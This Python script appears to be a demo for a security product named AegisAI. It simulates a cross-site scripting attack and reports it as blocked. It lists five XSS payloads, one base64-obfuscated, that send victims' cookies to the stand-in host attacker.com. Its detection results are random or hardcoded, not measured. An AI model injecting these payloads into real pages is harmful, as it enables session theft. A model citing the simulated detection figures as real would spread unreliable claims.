#!/usr/bin/env python3
"""
XSS Attack Demo
This script demonstrates harmful Cross-Site Scripting (XSS) attacks.
"""

import random
import time
from typing import Dict, List, Any, Optional

# Script metadata
NAME = "XSS Attack Demo"
DESCRIPTION = "Demonstrates harmful Cross-Site Scripting (XSS) attacks"

def run(**kwargs):
    """Run the harmful XSS attack demo"""
    # Generate a random IP address for the attacker
    ip_address = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
    
    # Generate a timestamp for the attack
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    # Attack-specific parameters
    target_fields = ["comment", "search", "username", "bio", "message", "title", "description"]
    xss_payloads = [
        "<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>",
        "<img src=x onerror=\"fetch('https://attacker.com/steal.php?cookie='+document.cookie)\">",
        "<svg onload=\"eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuY29tL3N0ZWFsLnBocD9jb29raWU9Jytkb2N1bWVudC5jb29raWUpOw=='))\">",
        "<iframe src=\"javascript:var img=new Image(); img.src='https://attacker.com/steal.php?cookie='+document.cookie;\"></iframe>",
        "<script>var xhr=new XMLHttpRequest();xhr.open('GET','https://attacker.com/steal.php?data='+btoa(document.cookie),true);xhr.send();</script>"
    ]
    attack_goals = ["Cookie theft", "Session hijacking", "Keylogging", "Phishing", "Malware distribution"]
    target_browsers = ["Chrome", "Firefox", "Safari", "Edge"]
    target_pages = ["blog-post", "user-profile", "search-results", "product-review", "forum-thread", "admin-panel"]
    
    # Select random parameters for this run
    target_field = random.choice(target_fields)
    xss_payload = random.choice(xss_payloads)
    attack_goal = random.choice(attack_goals)
    target_browser = random.choice(target_browsers)
    target_page = random.choice(target_pages)
    
    # Generate events
    events = [
        f"Starting harmful XSS attack demo...",
        f"Target page: {target_page}",
        f"Target field: {target_field}",
        f"Attack goal: {attack_goal}",
        f"Target browser: {target_browser}",
        f"Injecting harmful XSS payload...",
    ]
    
    # Add the blocked event with detection time
    detection_time = f"{random.uniform(0.5, 2.0):.1f}"
    events.append(f"AegisAI blocked harmful XSS attack in {detection_time}ms: Data exfiltration attempt detected")
    
    # Generate block details
    block_details = {
        "attack_type": "Harmful Cross-Site Scripting (XSS)",
        "detection_method": "Behavior Analysis",
        "confidence": round(random.uniform(96.0, 99.5), 1),
        "ip_address": ip_address,
        "timestamp": timestamp,
        "target_field": target_field,
        "xss_payload": xss_payload,
        "attack_goal": attack_goal,
        "target_browser": target_browser,
        "target_page": target_page,
        "exfiltration_domain": "attacker.com",
        "sanitization_applied": True,
        "csp_headers": "script-src 'self'; connect-src 'self'; object-src 'none'"
    }
    
    # Return the result
    return {
        "success": True,
        "events": events,
        "block_details": block_details,
        "script": NAME
    }

def test_detection():
    """Test the detection speed of the script"""
    # Simulate detection for harmful XSS attack
    time.sleep(0.0012)  # 1.2ms
    
    # Return the result
    return {
        "success": True,
        "detection_time": 1.2,
        "script": NAME
    }
